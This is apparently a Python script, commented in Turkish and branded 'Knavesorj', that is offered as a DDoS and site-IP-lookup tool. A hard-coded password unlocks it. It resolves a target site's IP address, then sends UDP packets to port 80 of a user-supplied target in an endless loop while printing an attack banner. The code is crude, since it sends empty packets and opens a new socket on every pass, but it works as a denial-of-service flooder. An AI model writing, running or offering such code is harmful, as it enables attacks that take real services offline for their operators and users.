import socket
import random
from colorama import Fore, Style

def hedef_sitenin_ip_adresini_bul(hedef_site):
    # "http://" ön eki varsa kaldır
    if hedef_site.startswith("http://"):
        hedef_site = hedef_site[7:]

    try:
        hedef_ip = socket.gethostbyname(hedef_site)
        print("Hedef siteye ait IP adresi: {}".format(hedef_ip))
    except socket.gaierror:
        print("Hedef siteye ait IP adresi bulunamadı.")

def ddos_hedefine_saldır():
    # Hedef IP veya URL'yi kullanıcıdan alın
    hedef = input("DDoS ve Site IP Çekme Aracı | Knavesorj\nHedef IP veya URL'yi girin: ")

    # Hedef IP ve URL'yi kontrol edin, herhangi biri dolu ise saldırıyı başlatın
    if hedef:
        hedef_ip = hedef
        hedef_url = ""
    else:
        hedef_ip = ""
        hedef_url = ""

    # DDoS saldırısı için sürekli olarak UDP paketleri gönderin
    while True:
        try:
            # Rastgele bir veri oluşturun (burada boş bir veri kullanıyoruz)
            data = b""

            # Bir UDP soket oluşturun ve hedefe paket gönderin
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            if hedef_ip:
                target = (hedef_ip, 80)  # Hedef port sabit olarak 80 olarak kabul edilsin
            else:
                target = (hedef_url, 80)
            sock.sendto(data, target)

            # Saldırıyı gerçekleştirdiğimizi belirtmek için ekrana bilgi yazdırın
            print(Fore.RED + "Knavesorj Tool: DDoS saldırısı başlatıldı: {}".format(hedef) + Style.RESET_ALL)
        except KeyboardInterrupt:
            break
        except:
            pass

# Şifre kontrolü
def sifre_kontrolu():
    sifre = input("Şifreyi girin: ")
    if sifre == "aretuza":
        hedef_site = input("DDoS ve Site IP Çekme Aracı | Knavesorj\nHedef siteyi girin: ")
        hedef_sitenin_ip_adresini_bul(hedef_site)

        # DDoS saldırısını başlatın
        print(Fore.YELLOW + "Knavesorj tarafından geliştirildi" + Style.RESET_ALL)
        ddos_hedefine_saldır()
    else:
        print("Yanlış şifre! Aracı başlatmak için doğru şifreyi girmelisiniz.")

# Ana program akışı
print(Fore.MAGENTA + "DDoS ve Site IP Çekme Aracı | Knavesorj" + Style.RESET_ALL)
sifre_kontrolu()